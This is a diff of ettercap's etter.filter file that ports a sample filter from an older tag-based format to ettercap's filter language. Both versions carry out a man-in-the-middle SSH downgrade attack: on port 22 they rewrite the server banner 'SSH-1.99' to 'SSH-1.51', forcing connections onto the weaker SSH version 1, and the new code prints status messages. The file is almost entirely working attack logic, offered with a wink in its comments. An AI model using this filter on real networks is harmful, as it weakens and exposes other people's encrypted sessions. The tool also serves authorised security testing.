@@ -1,9 +1,8 @@
 ############################################################################
 #                                                                          #
-#  ettercap -- etter.filter -- filter chain file                           #
+#  ettercap -- etter.filter -- filter source file                          #
 #                                                                          #
-#  Copyright (C) 2001  ALoR <alor@users.sourceforge.net>                   #
-#                      NaGA <crwm@freemail.it>                             #
+#  Copyright (C) 2001-2003  ALoR & NaGA                                    #
 #                                                                          #
 #  This program is free software; you can redistribute it and/or modify    #
 #  it under the terms of the GNU General Public License as published by    #
@@ -17,39 +16,25 @@
 #   This filter will substitute the SSH server response from SSH-1.99 to
 #   SSH-1.51, so if the server supports both ssh1 and ssh2 we will force
 #   it to use ssh1... ;)
-#   server response :    SSH-1.99    both ssh1 and ssh2 supported
-#                        SSH-1.51    only ssh1 supported
+#   server response :    SSH-2.00   only ssh2 supported
+#                        SSH-1.99   both ssh1 and ssh2 supported
+#                        SSH-1.51   only ssh1 supported
 ##
 
-##############################
-#### FILTER ON SOURCE IP #####
-##############################
+if (L4.proto == TCP) {
+   if (L4.tcp.port == 22) {
+      if ( replace(DATA.data, "SSH-1.99", "SSH-1.51") ) {
+         msg("SSH downgraded from version 2 to 1");
+      } else {
+         if ( search(DATA.data, "SSH-2.00") ) {
+            msg("Server support only SSH version 2");
+         } else {
+            if ( search(DATA.data, "SSH-1.51") ) {
+               msg("Server already support only version 1");
+            }
+         }
+      }
+   }
+}
 
-<filter source>
-   <id>0</id>
-   <proto>T</proto>
-   <source>22</source>
-   <dest>0</dest>
-   <search>1.99</search>
-   <action>R</action>
-   <replace>1.51</replace>
-   <goto></goto>
-   <elsegoto></elsegoto>
-</filter source>
-
-############################
-#### FILTER ON DEST IP #####
-############################
-
-<filter dest>
-   <id>0</id>
-   <proto>T</proto>
-   <source>0</source>
-   <dest>22</dest>
-   <search>1.99</search>
-   <action>R</action>
-   <replace>1.51</replace>
-   <goto></goto>
-   <elsegoto></elsegoto>
-</filter dest>
 
